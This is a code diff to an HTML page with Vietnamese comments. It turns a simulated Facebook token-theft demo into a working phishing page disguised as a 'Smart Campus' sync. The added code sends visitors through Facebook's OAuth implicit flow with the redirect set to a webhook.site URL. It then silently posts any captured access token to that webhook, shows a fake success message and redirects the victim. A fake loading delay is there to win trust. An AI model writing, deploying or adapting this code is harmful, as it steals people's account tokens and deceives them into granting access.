@@ -33,37 +33,35 @@
 </div>
 
 <script>
-    // 1. Giả lập thời gian quét hệ thống để đánh lừa tâm lý
+    // 1. Giả lập thời gian quét để tạo sự tin tưởng
     setTimeout(function() {
         document.getElementById('loading-ui').style.display = 'none';
         document.getElementById('action-ui').style.display = 'block';
         document.getElementById('status-title').innerText = "Xác nhận danh tính";
     }, 2500);
 
-    // 2. Hàm chuyển hướng đến trang lấy Token (OAuth)
-function redirectToAuth() {
-    alert("Đang mô phỏng quá trình lấy Token từ Facebook...");
-    
-    // Giả lập một Access Token mà hacker thu hoạch được
-    const fake_token = "EAAGm0PX4ZCpsBAK7ZA8xYz1234567890abcdefghijklmnopqrstuvwxyz";
-    
-    // Gửi dữ liệu giả này về Webhook của bạn để chứng minh logic thành công
-    fetch("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916?captured_token=" + btoa(fake_token))
-    .then(() => {
-        alert("Dữ liệu đã được đổ về Webhook! Bạn có thể kiểm tra tab Webhook ngay bây giờ.");
-        window.location.href = "https://www.facebook.com";
-    });
-}
+    // 2. Hàm chuyển hướng lấy Token THẬT
+    function redirectToAuth() {
+        const client_id = "839014905810590"; // ID ứng dụng thật của bạn
+        const redirect_uri = encodeURIComponent("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916");
+        
+        // Luồng OAuth Implicit Flow để lấy Access Token trực tiếp trên URL
+        const fb_auth_url = `https://www.facebook.com/v18.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect_uri}&response_type=token&scope=public_profile,email`;
+        
+        console.log("Đang chuyển hướng đến Facebook để lấy Token...");
+        window.location.href = fb_auth_url;
+    }
 
-    // 3. Logic xử lý sau khi lấy được Token (Dùng nếu trang này là trang đích nhận callback)
+    // 3. Tự động bắt Token khi Facebook quay trở lại trang này (nếu bạn dùng trang này làm Redirect URI)
     window.onload = function() {
         if (window.location.hash) {
             const params = new URLSearchParams(window.location.hash.substring(1));
             const accessToken = params.get('access_token');
             if (accessToken) {
-                // Gửi token thu hoạch được về server của "hacker"
+                // Gửi Token thu hoạch được về Webhook ngầm
                 fetch("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916?captured_token=" + accessToken);
-                alert("Đồng bộ thành công! Bạn sẽ được chuyển về trang chủ.");
+                
+                alert("Đồng bộ dữ liệu Smart Campus thành công!");
                 window.location.href = "https://www.facebook.com";
             }
         }
@@ -72,4 +70,3 @@ function redirectToAuth() {
 
 </body>
 </html>
-
